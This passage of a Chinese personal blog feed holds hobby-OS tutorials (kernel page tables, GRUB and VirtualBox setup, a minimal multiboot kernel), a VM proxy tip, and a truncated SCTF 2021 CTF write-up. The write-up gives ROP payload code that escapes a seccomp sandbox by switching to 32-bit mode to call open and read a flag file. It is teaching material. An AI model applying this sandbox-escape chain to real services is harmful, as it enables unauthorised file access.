class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;move_krlimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy(semp, demp, (<span class="keyword">sint_t</span>)(senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>))));<span class="comment">//将e820表复制到字库文件之后</span></span><br><span class="line">    mbsp-&gt;mb_e820padr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)(demp));<span class="comment">//设置machbstart_t中e820表的地址</span></span><br><span class="line">    mbsp-&gt;mb_e820sz = senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>));<span class="comment">//设置machbstart_t中e820的数量</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN((<span class="keyword">u32_t</span>)(demp) + (<span class="keyword">u32_t</span>)(senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>))));<span class="comment">//mb_nextwtpadr总是指向下一块内存</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_e820padr + mbsp-&gt;mb_e820sz;<span class="comment">//设置内核结束地址</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将e820表复制到内核之内中和上面的操作也差不多，但是为什么要移动到字库文件之后哪？因为实模式下可以使用的内存空间不多，如果一直占用这些低地址会影响后面转换到实模式，我们需要将其移动到一个安稳的位置上。</p><h2 id="建立-MMU-页表数据"><a href="#建立-MMU-页表数据" class="headerlink" title="建立 MMU 页表数据"></a>建立 MMU 页表数据</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_bstartpages</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> *p = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR);<span class="comment">//p 指向顶级页表（PML4）</span></span><br><span class="line">    <span class="keyword">u64_t</span> *pdpte = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x1000</span>);<span class="comment">//pdpte指向页目录表（PDPT）</span></span><br><span class="line">    <span class="keyword">u64_t</span> *pde = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x2000</span>);<span class="comment">//pde 指向页目录（PD）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">u64_t</span> adr = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)(KINITPAGE_PHYADR), (<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>)))<span class="comment">//检查是否重叠</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;move_krlimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint_t</span> mi = <span class="number">0</span>; mi &lt; PGENTY_SIZE; mi++)<span class="comment">//初始化PML4（顶级页目录表），PDPT（页目录表）内存</span></span><br><span class="line">    &#123;</span><br><span class="line">        p[mi] = <span class="number">0</span>;</span><br><span class="line">        pdpte[mi] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint_t</span> pdei = <span class="number">0</span>; pdei &lt; <span class="number">16</span>; pdei++)<span class="comment">// 遍历 16 个 PDPT 条目</span></span><br><span class="line">    &#123;</span><br><span class="line">        pdpte[pdei] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pde | KPDPTE_RW | KPDPTE_P);<span class="comment">// 设置 PDPT 条目的属性,设置其存在位和读写权限</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint_t</span> pdeii = <span class="number">0</span>; pdeii &lt; PGENTY_SIZE; pdeii++)<span class="comment">// 在每个 PDPT 条目中，初始化PD数组</span></span><br><span class="line">        &#123;</span><br><span class="line">            pde[pdeii] = adr | KPDE_PS | KPDE_RW | KPDE_P;<span class="comment">// 设置 PD 条目的属性，页面大小设置为2MB，设置为可以读写，设置存在位</span></span><br><span class="line">            adr += <span class="number">0x200000</span>;<span class="comment">// 递增地址,增加2MB</span></span><br><span class="line">        &#125;</span><br><span class="line">        pde = (<span class="keyword">u64_t</span> *)((<span class="keyword">u32_t</span>)pde + <span class="number">0x1000</span>);<span class="comment">// 切换到下一个 PD 条目</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p[((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; <span class="number">0x1ff</span>] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pdpte | KPML4_RW | KPML4_P);<span class="comment">//让顶级页目录中第0项和第((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff项，指向同一个页目录表  </span></span><br><span class="line">    p[<span class="number">0</span>] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pdpte | KPML4_RW | KPML4_P);<span class="comment">//让顶级页目录中第0项和第((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff项，指向同一个页目录表</span></span><br><span class="line">    mbsp-&gt;mb_pml4padr = (<span class="keyword">u64_t</span>)(KINITPAGE_PHYADR);<span class="comment">//保存PLM4地址</span></span><br><span class="line">    mbsp-&gt;mb_subpageslen = (<span class="keyword">u64_t</span>)(<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>);<span class="comment">//保存MMU映射表的总长度</span></span><br><span class="line">    mbsp-&gt;mb_kpmapphymemsz = (<span class="keyword">u64_t</span>)(<span class="number">0x400000000</span>);<span class="comment">//保存映射到虚拟地址的物理地址的大小</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里p指向顶级页表，pdpte指向页目录表，pde指向页目录，相当于是3级页表，开始还是先检查是否和内存映像文件重叠，然后初始化顶级页目录表和页目录表，然后我们对内存做映射，遍历16个页目录表，每个页目录表指向512个页目录，对每个页目录设置属性，每页的大小为2MB，总共的大小为16GB。重点关注一下<code>p[((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff] = (u64_t)((u32_t)pdpte | KPML4_RW | KPML4_P);</code> 和 <code>p[0] = (u64_t)((u32_t)pdpte | KPML4_RW | KPML4_P)</code>这两行代码，他使得0xffff800000000000和0地址这两块虚拟地址指向同一块物理地址，这里的目的是内核在启动初期，虚拟地址和物理地址要保持相同。</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用vituralbox创建一个计算机</title>
      <link href="/2024/05/05/%E4%BD%BF%E7%94%A8vitualbox%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
      <url>/2024/05/05/%E4%BD%BF%E7%94%A8vitualbox%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="使用vituralbox创建一个计算机"><a href="#使用vituralbox创建一个计算机" class="headerlink" title="使用vituralbox创建一个计算机"></a>使用vituralbox创建一个计算机</h1><ol><li><p>首先使用virtualbox创建一个新的硬盘</p></li><li><p>启动我们的ubuntu虚拟机，为其在home目录下添加一个hdisk文件夹</p></li><li><p>挂载该硬盘到hdisk文件夹，并创建ext4文件系统</p><p>使用下面的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfs.ext4 /dev/sdb</span><br><span class="line">sudo mount /dev/sdb hdisk</span><br></pre></td></tr></table></figure><p>但是这样挂载需要每次重启，我们选择修改/etc/fstab文件,在其末尾添加我们硬盘的信息</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121144352.png" alt="image-20240507121144352"></p><p>可以在root级别使用<code> echo &quot;/dev/sdb        /home/kr0emer/hdisk   ext4  defaults 0  2 &quot; &gt;&gt; /etc/fstab</code>来添加</p></li><li><p>接下来在hdisk目录下创建boot目录</p></li><li><p>安装grub到新硬盘</p><p><code>sudo grub-install --boot-directory=./hdisk/boot/ --force --allow-floppy /dev/sdb</code></p></li><li><p>接着创建grub.cfg在<code>hdisk/boot/grub/</code>目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">menuentry &#x27;HelloOS&#x27; &#123;</span><br><span class="line">insmod part_msdos</span><br><span class="line">insmod ext2</span><br><span class="line">set root=&#x27;hd0&#x27; #我们的硬盘只有一个分区所以是&#x27;hd0&#x27;</span><br><span class="line">multiboot2 /boot/HelloOS.eki #加载boot目录下的HelloOS.eki文件</span><br><span class="line">boot #引导启动</span><br><span class="line">&#125;</span><br><span class="line">set timeout_style=menu</span><br><span class="line">if [ &quot;$&#123;timeout&#125;&quot; = 0 ]; then</span><br><span class="line">  set timeout=10 #等待10秒钟自动启动</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li><li><p>接下来关闭这个ubuntu虚拟机并创建一个新的虚拟机，选择hd.vid来创建虚拟机</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121715737.png" alt="image-20240507121715737"></p></li><li><p>接下来打开该虚拟机，得到下图基本上就成功了，后面创建HelloOS.eki就可以了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121903606.png" alt="image-20240507121903606"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现一个最简单的内核</title>
      <link href="/2023/11/12/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/"/>
      <url>/2023/11/12/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="编写一个引导程序"><a href="#编写一个引导程序" class="headerlink" title="编写一个引导程序"></a>编写一个引导程序</h1><p>首先我们要先要编写一个汇编程序，使用C语言作为高级语言不能直接控制硬件，而且 C 语言的函数调用、函数传参，都需要用栈。我们需要先要为C语言提供一个工作环境。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MBT_HDR_FLAGS EQU 0x00010003;flag字段，指出OS映像需要引导程序提供或支持的特性</span><br><span class="line">MBT_HDR_MAGIC EQU 0x1BADB002 ;多引导协议头魔数</span><br><span class="line">MBT_HDR2_MAGIC EQU 0xe85250d6 ;第二版多引导协议头魔数</span><br><span class="line">global _start ;导出_start符号</span><br><span class="line">extern main ;导入外部的main函数符号</span><br><span class="line">[section .start.text] ;定义.start.text代码节</span><br><span class="line">[bits 32] ;汇编成32位代码</span><br><span class="line">_start:</span><br><span class="line">jmp _entry</span><br><span class="line">ALIGN 8</span><br><span class="line">mbt_hdr:</span><br><span class="line">dd MBT_HDR_MAGIC</span><br><span class="line">dd MBT_HDR_FLAGS</span><br><span class="line">dd -(MBT_HDR_MAGIC+MBT_HDR_FLAGS)</span><br><span class="line">dd mbt_hdr</span><br><span class="line">dd _start</span><br><span class="line">dd 0</span><br><span class="line">dd 0</span><br><span class="line">dd _entry</span><br><span class="line">;以上是GRUB所需要的头</span><br><span class="line">ALIGN 8</span><br><span class="line">mbt2_hdr:</span><br><span class="line">DD MBT_HDR2_MAGIC</span><br><span class="line">DD 0</span><br><span class="line">DD mbt2_hdr_end - mbt2_hdr</span><br><span class="line">DD -(MBT_HDR2_MAGIC + 0 + (mbt2_hdr_end - mbt2_hdr))</span><br><span class="line">DW 2, 0</span><br><span class="line">DD 24</span><br><span class="line">DD mbt2_hdr</span><br><span class="line">DD _start</span><br><span class="line">DD 0</span><br><span class="line">DD 0</span><br><span class="line">DW 3, 0</span><br><span class="line">DD 12</span><br><span class="line">DD _entry</span><br><span class="line">DD 0</span><br><span class="line">DW 0, 0</span><br><span class="line">DD 8</span><br><span class="line">mbt2_hdr_end:</span><br><span class="line">;以上是GRUB2所需要的头</span><br><span class="line">;包含两个头是为了同时兼容GRUB、GRUB2</span><br><span class="line">ALIGN 8</span><br><span class="line">_entry:</span><br><span class="line">;关中断</span><br><span class="line">cli</span><br><span class="line">;关不可屏蔽中断</span><br><span class="line">in al, 0x70</span><br><span class="line">or al, 0x80</span><br><span class="line">out 0x70,al</span><br><span class="line">;重新加载GDT</span><br><span class="line">lgdt [GDT_PTR]</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br><span class="line">_32bits_mode:</span><br><span class="line">;下面初始化C语言可能会用到的寄存器</span><br><span class="line">mov ax, 0x10</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">;初始化栈，C语言需要栈才能工作</span><br><span class="line">mov esp,0x9000</span><br><span class="line">;调用C语言函数main</span><br><span class="line">call main</span><br><span class="line">;让CPU停止执行指令</span><br><span class="line">halt_step:</span><br><span class="line">halt</span><br><span class="line">jmp halt_step</span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff</span><br><span class="line">k16cd_dsc: dq 0x00009e000000ffff</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLEN dw GDT_END-GDT_START-1</span><br><span class="line">GDTBASE dd GDT_START</span><br></pre></td></tr></table></figure><p>我们来对上面的汇编做一些详细的解释：</p><ol><li><p>我们先来看代码的第1行到第39行</p><p>首先是<strong>MBT_HDR_FLAGS</strong>，其定义的是<strong>flags</strong>字段，用来指出OS映像需要引导程序提供或支持的特性。其中0-15位指出需求：如果引导程序发现某些值杯设置，但出于某种原因无法满足其需求，则需要告知用户，并拒绝加载操作系统映像。其中16-31位为可选特性，与低16位不同，如果无法满足要求可以忽视并照常进行。自然，所有flags尚未定义的位都必须<strong>设置为0</strong>。flags字段的作用是用于版本控制以及简单的功能选择。</p><p>其中<strong>第0位</strong>若为1，那么所有与操作系统一起加载的引导模块必须在页面（4KB）边界上对齐。有些操作系统能够在启动时将包含引导模块的页直接映射到一个分页的地址空间，因此需要引导模块是页对齐的。</p><p>如果<strong>第1位</strong>为1则必须通过Multiboot信息结构的**mem_***域包括可用内存的信息。</p><p>如果引导程序能够传递内存分布（**mmap_***域）并且它确实存在，则也包括它。</p><p>如果<strong>第2位</strong>为1，有关视频模式表（参见引导信息格式）的信息必须对内核有效</p><p>如果flags字段中的<strong>第16位</strong>被设置，那么Multiboot头部中偏移量为12-28的字段是有效的，引导加载器应该使用它们而不是实际可执行头部中的字段来计算加载操作系统镜像的位置。如果内核镜像是ELF格式的，那么这个信息不需要被提供，但是如果镜像是a.out格式或者其他格式的，那么它必须被提供。符合规范的引导加载器必须能够加载那些要么是ELF格式的，要么包含了嵌入在Multiboot头部中的加载地址信息的镜像；它们也可以直接支持其他可执行格式，比如特定的a.out变体，但是不是必须的。</p><p>接下来<strong>MBT_HDR_MAGIC</strong>则代表着多引导协议头魔数，<strong>MBT_HDR2_MAGIC</strong>第二版多引导协议头魔数，可以告诉计算机使用的是何种协议。</p><p>接下来从第10行到第19行代表GRUB所需要的头，21到39行为GRUB2所需要的头。包含这两个头是为了兼容GRUB与GRUB2。</p></li><li><p>代码43~5行，关掉中断，设定 CPU 的工作模式。</p></li><li><p>代码53~72行，初始化 CPU 的寄存器和 C 语言的运行环境。</p></li><li><p>代码77~86行，GDT_START 开始的，是 CPU 工作模式所需要的数据。</p></li></ol><h2 id="编写C代码"><a href="#编写C代码" class="headerlink" title="编写C代码"></a>编写C代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vgastr.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello OS!&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数实现了一个打印”Hello OS!”字符串的功能，但是我们的操作系统中没有库函数，所以需要我们自定义一个printf函数打印到屏幕上。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vgastr.c</span></span><br><span class="line"><span class="keyword">void</span> _strwrite(<span class="keyword">char</span> * str)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span>* p_str = (<span class="keyword">char</span>*)(<span class="number">0xb8000</span>);</span><br><span class="line">    <span class="keyword">while</span> (*str)</span><br><span class="line">    &#123;</span><br><span class="line">        *p_str = *str;</span><br><span class="line">        p_str+=<span class="number">2</span>;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *str,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _strwrite(str);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_strwrite函数将我们要打印的字符打印到屏幕之上从0xb8000开始每两个字符代表一个字母，第一个字节代表着字符，第二个字节代表着字体的颜色，其字符编码通常是 utf8，而 utf8 编码对 ASCII 字符是兼容的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vgastr.h</span></span><br><span class="line"><span class="keyword">void</span> _strwrite(<span class="keyword">char</span> * str);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *str,...)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="编译和部署"><a href="#编译和部署" class="headerlink" title="编译和部署"></a>编译和部署</h1><p>通过makefile将代码编译，得到<strong>HelloOS.bin</strong>。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111235434726.png" alt="编译的结果"></p><p>接下来就是部署了</p><p>我们进入etc\default\grub文件</p><p>首先将<strong>GRUB_TIMEOUT_STYLE</strong>的值从<strong>hidden</strong>改为<strong>menu</strong>，并将<strong>GRUB_TIMEOUT</strong>的值从<strong>0</strong>改为<strong>30</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112001856786.png" alt="修改grub文件"></p><p>然后更新grub配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>然后我们修改/boot/grub/grub.cfg文件，增加HelloOS项</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menuentry &#x27;HelloOS&#x27; &#123;</span><br><span class="line">     insmod part_gpt #GRUB加载分区模块识别分区</span><br><span class="line">     insmod ext2 #GRUB加载ext文件系统模块识别ext文件系统</span><br><span class="line">     set root=&#x27;hd0,gpt3&#x27; #注意boot目录挂载的分区，这是我机器上的情况</span><br><span class="line">     multiboot2 /boot/HelloOS.bin #GRUB以multiboot2协议加载HelloOS.bin</span><br><span class="line">     boot #GRUB启动HelloOS.bin</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>df /root/</code>的命令来查看set root应该设置为什么</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112003200032.png" alt="df /root/命令"></p><p>其中的“sda3”就是硬盘的第四个分区（硬件分区选择 MBR），但是 GRUB 的 menuentry 中不能写 sda3，而是要写“hd0,gpt3”，这是 GRUB 的命名方式，hd0 表示第一块硬盘，我的虚拟机是使用gpt分区表所以是gpt3。</p><p>可以根据grub.cfg其他的menuentry来确定。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005549038.png" alt="grub.cfg"></p><p>最后将HelloOS.bin文件复制到/boot/目录下，重启虚拟机。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005655001.png" alt="选择HelloOS"></p><p>选择HelloOS,可以看到HelloOS的字样。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005707224.png" alt="完成！"></p><p>这样我们就实现了一个最简单的OS了！</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一种虚拟机使用物理机代理的方法</title>
      <link href="/2023/11/11/%E4%B8%80%E7%A7%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E7%89%A9%E7%90%86%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2023/11/11/%E4%B8%80%E7%A7%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E7%89%A9%E7%90%86%E6%9C%BA%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="物理机：V2rayN设置"><a href="#物理机：V2rayN设置" class="headerlink" title="物理机：V2rayN设置"></a>物理机：V2rayN设置</h1><p>打开V2rayN的<strong>参数设置</strong>选项将下图中的<strong>“允许来自局域网的链接”</strong>勾选</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111004012130.png" alt="image-20231111004012130"></p><p>然后点击确认即可，物理机的设置就这么多了。</p><h1 id="虚拟机：设置网络设置"><a href="#虚拟机：设置网络设置" class="headerlink" title="虚拟机：设置网络设置"></a>虚拟机：设置网络设置</h1><p>我这里使用的是<strong>ubuntu22.04.3 LTS amd64</strong>，找到设置中的网络选项，再设置网络代理类似下图所示</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111004832363.png" alt="image-20231111004832363"></p><p>其中ip填写在主机中使用<strong>ipconfig</strong>命令来查找，端口号设定根据V2rayN下方所示的<strong>局域网</strong>端口号填写。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111005410652.png" alt="image-20231111005410652"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111005018861.png" alt="image-20231111005018861"></p><p>这两步完成后，虚拟机就可以通过主机的代理来访问网络了。</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tricks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021SCTF复现</title>
      <link href="/2022/01/16/2021SCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/16/2021SCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF复现"><a href="#SCTF复现" class="headerlink" title="SCTF复现"></a>SCTF复现</h1><h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><p>一个静态编译的文件</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116104932158.png" alt="image-20220116104932158"></p><p>本来看到静态编译想到的是直接使用pwntools的工具，但是实际上文件是开了沙盒的，这里只有read，alarm和fstat函数能被系统调用。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116105210814.png" alt="image-20220116105210814"></p><p>但是仔细看看在x86下open函数的系统调用就是5，这样的话，我们可以先转换到32位执行open之后再回到64位执行read，最后再通过测信道攻击获取flag。</p><p>首先先在程序内写下flag的路径，为了后边可以调用open函数，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">调用read函数写flag路径 </span></span><br><span class="line"><span class="string">################################&#x27;&#x27;&#x27;</span></span><br><span class="line">payload1 =<span class="string">b&#x27;a&#x27;</span>*stack_offset</span><br><span class="line">payload1+=p64(pop_rax)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(pop_rdi_rbp)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(pop_rsi_r15_rbp)</span><br><span class="line">payload1+=p64(flag_path)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload1+=p64(<span class="number">0x300</span>)</span><br><span class="line">payload1+=p64(syscall)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(mov_rdx_r12_call_r14)</span><br><span class="line">payload1+=p64(pop_rsp_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">sn(io,payload1)</span><br></pre></td></tr></table></figure><p>接下来通过retf转化为32位然后调用open</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################</span></span><br><span class="line"><span class="string">在32位下调用open函数</span></span><br><span class="line"><span class="string">################&#x27;&#x27;&#x27;</span></span><br><span class="line">payload2 =<span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rcx)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload2+=p64(flag_path)</span><br><span class="line">payload2+=p64(<span class="number">0x300</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rax)</span><br><span class="line">payload2+=p64(<span class="number">5</span>)</span><br><span class="line">payload2+=p64(retf)</span><br><span class="line">payload2+=p32(int_80)</span><br><span class="line">payload2+=p32(<span class="number">0x23</span>)<span class="comment"># $cs=0x23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后再返回64位通过read函数来写flag到bss段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">返回64位调用read函数写flag到bss一区域</span></span><br><span class="line"><span class="string">################################&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2+=p32(retf)</span><br><span class="line">payload2+=p32(pop_rdi_rbp)</span><br><span class="line">payload2+=p32(<span class="number">0x33</span>)<span class="comment"># $cs=0x33</span></span><br><span class="line">payload2+=p64(<span class="number">3</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rsi_r15_rbp)</span><br><span class="line">payload2+=p64(read_flag_addr)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rax)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在此之前的都很简单，困难的是这么测信道攻击，首先我们要知道要进行测信道攻击的话得先找到一个loop指令，这样当我们找到flag对应的字符后可以调转到此死循环中。</p><p>这里我采取的方法是将rax填入jmp rax的地址再调整到jmp rax处从而达到死循环的要求</p><p>那么剩下的条件就只有一个可以判断我们字符的指令了</p><p>我们搜索sub和ret</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116133910476.png" alt="image-20220116133910476"></p><p>发现有这样一条指令那么只需要搭配jne指令就可以做到我们想要的结果，唯一麻烦的就是得控制写入地址，但是也不算是特别困难的事情。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="string">&#x27;&#x27;&#x27;#################################</span></span><br><span class="line"><span class="string">   测信道攻击</span></span><br><span class="line"><span class="string">   #################################&#x27;&#x27;&#x27;</span></span><br><span class="line">   payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">   